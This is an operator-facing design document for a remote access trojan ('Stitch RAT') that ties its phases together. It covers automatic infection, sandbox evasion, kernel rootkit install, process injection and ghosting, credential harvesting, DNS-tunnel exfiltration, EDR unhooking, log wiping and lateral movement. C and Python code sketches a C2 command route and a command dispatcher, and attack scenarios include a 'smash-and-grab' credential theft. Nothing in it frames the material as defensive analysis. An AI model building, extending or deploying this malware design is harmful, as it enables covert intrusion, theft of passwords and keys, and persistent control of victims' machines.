# RAT INTEGRATION ARCHITECTURE
## How Phase 1-3 Components Work Together

---

## 🎯 OPERATIONAL OVERVIEW

The RAT operates in **three layers**:
1. **Autonomous Operations** - Automatic, no user intervention
2. **Dashboard Controls** - User-triggered via web UI
3. **Hybrid Intelligence** - Automated with user oversight

---

## 🔄 AUTOMATIC OPERATIONS (No Dashboard Needed)

### 1. Initial Infection & Setup
```
[Automatic Flow]
Payload Delivered → Anti-Analysis Checks → Establish C2 → Install Persistence
     ↓                    ↓                      ↓              ↓
Phase 1 Payload    Phase 1 Anti-Debug    Phase 1 Protocol   Phase 3 Rootkit
```

**What happens automatically:**
- **Polymorphic payload** (Phase 1) executes with unique signature
- **Anti-analysis checks** (Phase 1) detect sandbox/VM/debugger
- **C2 connection** (Phase 1) establishes encrypted channel
- **Process ghosting** (Phase 3) hides from memory scanners
- **Rootkit installation** (Phase 3) for kernel-level persistence
- **Credential harvesting** (Phase 3) begins silently

### 2. Persistence & Stealth
```c
// This runs automatically on payload execution
void auto_establish_foothold() {
    // Phase 1: Anti-detection
    if (detect_sandbox()) {
        act_legitimate();  // Fake normal behavior
        return;
    }
    
    // Phase 3: Advanced persistence
    if (is_admin()) {
        install_kernel_rootkit();     // Hide at kernel level
        hide_process(getpid());        // Hide ourselves
    }
    
    // Phase 2: Process injection for spreading
    inject_into_browser();  // Hide in legitimate process
    
    // Phase 3: Credential harvesting
    harvest_credentials_silent();
    
    // Phase 3: Setup covert channels
    setup_dns_tunnel_fallback();  // Backup C2 channel
}
```

### 3. Automatic Data Collection
The RAT continuously collects without user input:
- System information every 30 minutes
- New passwords as they're typed (keylogger)
- Network shares when discovered
- Screenshots on sensitive window titles
- Credentials from memory

---

## 🖥️ DASHBOARD CONTROLS (User-Triggered)

### Web Dashboard Layout:

```
┌──────────────────────────────────────────────────────────┐
│  STITCH RAT COMMAND & CONTROL DASHBOARD                  │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  [🔴 LIVE TARGETS: 47]  [🟢 ONLINE: 43]  [🔵 TASKS: 12] │
│                                                          │
│  ┌─────────────────┬──────────────────────────────────┐ │
│  │ TARGET LIST     │ CONTROL PANEL                    │ │
│  │                 │                                   │ │
│  │ 🖥️ PC-001      │ ┌─── Quick Actions ─────────────┐ │
│  │ 🖥️ PC-002  ←   │ │ [📁 Files] [📸 Screenshot]   │ │
│  │ 🖥️ PC-003      │ │ [💻 Shell] [📊 Sysinfo]      │ │
│  │ ...            │ └─────────────────────────────────┘ │
│  │                 │                                   │ │
│  │                 │ ┌─── Advanced Operations ───────┐ │
│  │                 │ │                               │ │
│  │                 │ │ 🎯 INJECTION ATTACKS          │ │
│  │                 │ │ [Select Process ▼]            │ │
│  │                 │ │ [Select Technique ▼]          │ │
│  │                 │ │ [💉 INJECT]                   │ │
│  │                 │ │                               │ │
│  │                 │ │ 🔒 PERSISTENCE                │ │
│  │                 │ │ [🛡️ Install Rootkit]         │ │
│  │                 │ │ [👻 Process Ghost]            │ │
│  │                 │ │ [📅 Schedule Task]            │ │
│  │                 │ │                               │ │
│  │                 │ │ 📡 EXFILTRATION               │ │
│  │                 │ │ [🌐 DNS Tunnel]               │ │
│  │                 │ │ [☁️ Cloud Upload]            │ │
│  │                 │ │ [📧 Email Send]               │ │
│  │                 │ │                               │ │
│  │                 │ │ 🔑 CREDENTIAL HARVESTING      │ │
│  │                 │ │ [🔐 Dump Credentials]         │ │
│  │                 │ │ [🌐 Browser Passwords]        │ │
│  │                 │ │ [🔑 SSH Keys]                 │ │
│  │                 │ │                               │ │
│  │                 │ │ 🚀 LATERAL MOVEMENT           │ │
│  │                 │ │ [Target Host: ___]            │ │
│  │                 │ │ [🔄 Pivot]                    │ │
│  │                 │ └───────────────────────────────┘ │
│  └─────────────────┴──────────────────────────────────┘ │
└──────────────────────────────────────────────────────────┘
```

---

## 🔗 HOW COMPONENTS INTEGRATE

### Phase 1 → Phase 2 → Phase 3 Flow:

```python
# Backend integration in web_app_real.py

@app.route('/api/target/<target_id>/action', methods=['POST'])
def execute_action(target_id):
    action = request.json['action']
    target = get_target(target_id)
    
    if action == 'inject':
        # Phase 2: Process Injection
        process_list = get_remote_processes(target)  
        technique = request.json['technique']
        payload = generate_injection_payload()  # Phase 1 polymorphic
        
        command = {
            'cmd': 'inject',
            'pid': request.json['pid'],
            'technique': technique,
            'payload': payload
        }
        
    elif action == 'ghost':
        # Phase 3: Process Ghosting
        command = {
            'cmd': 'execute_ghost',
            'payload': get_polymorphic_payload(),  # Phase 1
            'method': 'memfd'  # or 'transaction' for Windows
        }
        
    elif action == 'rootkit':
        # Phase 3: Rootkit Installation
        command = {
            'cmd': 'install_rootkit',
            'hide_pids': [target.pid],
            'hide_ports': [4433, 31337],
            'backdoor_port': 31337
        }
        
    elif action == 'harvest':
        # Phase 3: Credential Harvesting
        command = {
            'cmd': 'harvest_creds',
            'targets': ['browsers', 'ssh', 'memory', 'env'],
            'exfil_method': 'dns'  # Use DNS tunnel for stealth
        }
        
    elif action == 'dns_tunnel':
        # Phase 3: Setup DNS Tunneling
        command = {
            'cmd': 'setup_dns',
            'server': '8.8.8.8',
            'domain': 'data.example.com',
            'mode': 'exfil'
        }
        
    # Send command through encrypted C2 channel (Phase 1)
    send_encrypted_command(target, command)
    
    return jsonify({'status': 'success', 'task_id': generate_task_id()})
```

---

## 📊 INTEGRATION EXAMPLES

### Example 1: Automated Breach Chain
```
1. Initial payload executes (Phase 1)
   ↓
2. Automatically injects into explorer.exe (Phase 2)
   ↓
3. Harvests credentials from memory (Phase 3)
   ↓
4. Installs rootkit for persistence (Phase 3)
   ↓
5. Sets up DNS tunnel as backup C2 (Phase 3)
   ↓
6. Reports success to dashboard
```

### Example 2: User-Initiated Advanced Attack
```
User clicks "Dump Credentials" on dashboard
   ↓
Dashboard sends encrypted command (Phase 1 protocol)
   ↓
RAT receives and decrypts command
   ↓
Executes credential harvester (Phase 3)
   ↓
Exfiltrates via DNS tunnel (Phase 3)
   ↓
Results appear in dashboard UI
```

### Example 3: Hybrid Automation
```
RAT detects new admin privileges
   ↓
Automatically escalates to kernel (Phase 3 rootkit)
   ↓
Notifies dashboard: "Rootkit available"
   ↓
User clicks "Hide Network Connections"
   ↓
Rootkit hides C2 traffic automatically thereafter
```

---

## 🎮 DASHBOARD BUTTON MAPPING

### Basic Controls (Phase 1):
- **[Shell]** → Opens reverse shell
- **[Files]** → Browse/download/upload files  
- **[Screenshot]** → Capture screen
- **[Sysinfo]** → Get system information
- **[Kill]** → Terminate RAT

### Advanced Controls (Phase 2):
- **[Process List]** → Enumerate with injection scores
- **[Inject]** → Select process & technique, execute injection
- **[Migrate]** → Move RAT to another process
- **[Hollow]** → Process hollowing attack

### Elite Controls (Phase 3):
- **[Install Rootkit]** → Deploy kernel module
- **[Ghost Process]** → Create fileless process
- **[DNS Tunnel]** → Establish covert channel
- **[Harvest All]** → Automated credential theft
- **[Persistence Pack]** → Install multiple persistence methods

---

## 💾 BACKEND COMMAND ROUTING

```c
// In native_payloads/core/commands.c
int handle_command(command_packet_t* cmd) {
    switch(cmd->type) {
        // Phase 1 Commands
        case CMD_SHELL:
            return cmd_shell(cmd->data, cmd->len, output, &out_len);
            
        case CMD_SCREENSHOT:
            return capture_screenshot(output, &out_len);
            
        // Phase 2 Commands  
        case CMD_INJECT:
            injection_params_t* params = (injection_params_t*)cmd->data;
            return perform_injection(params->pid, params->technique, 
                                   params->payload, params->payload_len);
            
        // Phase 3 Commands
        case CMD_INSTALL_ROOTKIT:
            return install_kernel_rootkit();
            
        case CMD_GHOST_PROCESS:
            ghost_params_t* ghost = (ghost_params_t*)cmd->data;
            return ghost_process(ghost->payload_path, ghost->target_path);
            
        case CMD_DNS_TUNNEL:
            dns_params_t* dns = (dns_params_t*)cmd->data;
            return setup_dns_tunnel(dns->server, dns->domain);
            
        case CMD_HARVEST_CREDS:
            return harvest_all_credentials();
    }
}
```

---

## 🔐 SECURITY & STEALTH FLOW

### Automatic Evasion Chain:
1. **Polymorphic mutation** on each execution (Phase 1)
2. **Anti-analysis checks** before sensitive operations (Phase 1)
3. **Process injection** to hide in legitimate process (Phase 2)
4. **Rootkit cloaking** at kernel level (Phase 3)
5. **DNS tunneling** when main C2 blocked (Phase 3)
6. **Process ghosting** for new spawns (Phase 3)

### User-Triggered Evasion:
- **[Unhook NTDLL]** - Remove EDR hooks
- **[Disable ETW]** - Blind Windows telemetry
- **[Clear Logs]** - Remove forensic artifacts
- **[Wipe & Exit]** - Secure self-destruction

---

## 📈 TELEMETRY & MONITORING

The dashboard continuously shows:
```javascript
// Real-time updates via WebSocket
socket.on('target_update', (data) => {
    updateTargetStatus(data.id, data.status);
    
    if (data.auto_actions) {
        // Show what RAT did automatically
        showNotification(`Target ${data.id}: ${data.auto_actions}`);
    }
    
    if (data.credentials_found) {
        updateCredentialCount(data.credentials_found);
    }
    
    if (data.rootkit_installed) {
        enableAdvancedControls(data.id);
    }
});
```

---

## 🎯 TYPICAL ATTACK SCENARIOS

### Scenario 1: APT-Style Long-term Persistence
```
Automatic:
- Payload establishes C2
- Installs rootkit
- Hides in kernel
- Harvests credentials continuously
- Exfiltrates via DNS slowly

Dashboard Shows:
- Green indicator for persistence
- Credential count increasing
- Network map building
- No user action needed for months
```

### Scenario 2: Smash-and-Grab Operation
```
User-Driven:
1. Click "Select All Targets"
2. Click "Harvest All Credentials"  
3. Click "Exfiltrate via DNS"
4. Click "Wipe & Exit"

All Phase 1-3 components work together for rapid exploitation
```

### Scenario 3: Stealthy Lateral Movement
```
Hybrid:
- RAT automatically finds domain admin token (Phase 3)
- Alerts dashboard: "High-value credential found"
- User clicks "Pivot to Domain Controller"
- RAT uses token to move laterally (Phase 2 injection)
- Process repeats on new target
```

---

## 🔧 CONFIGURATION

```python
# config.py
RAT_CONFIG = {
    'autonomous': {
        'auto_persist': True,
        'auto_harvest': True,
        'auto_inject': True,
        'auto_rootkit': False,  # Requires user approval
        'auto_exfil': True,
        'auto_spread': False    # Requires user approval
    },
    
    'stealth': {
        'use_polymorphism': True,
        'use_encryption': True,
        'use_dns_tunnel': True,
        'use_process_ghosting': True,
        'anti_forensics': True
    },
    
    'dashboard': {
        'show_advanced': True,
        'enable_dangerous': True,
        'auto_refresh': 5,  # seconds
        'credential_alerts': True
    }
}
```

---

## SUMMARY

**Automatic Operations (60%):**
- Persistence installation
- Credential harvesting  
- Anti-analysis evasion
- Covert channel establishment
- Self-spreading (when enabled)

**Dashboard Controls (40%):**
- Targeted attacks
- Manual pivoting
- Specific data exfiltration
- Rootkit configuration
- Advanced persistence options

**The Beauty:** The RAT is intelligent enough to operate autonomously while giving operators full control when needed. Phase 1 provides the foundation, Phase 2 adds manipulation capabilities, and Phase 3 brings advanced persistence and evasion - all working together seamlessly.

The dashboard isn't just buttons - it's a **mission control center** showing real-time intelligence from all infected systems while allowing surgical strikes when needed.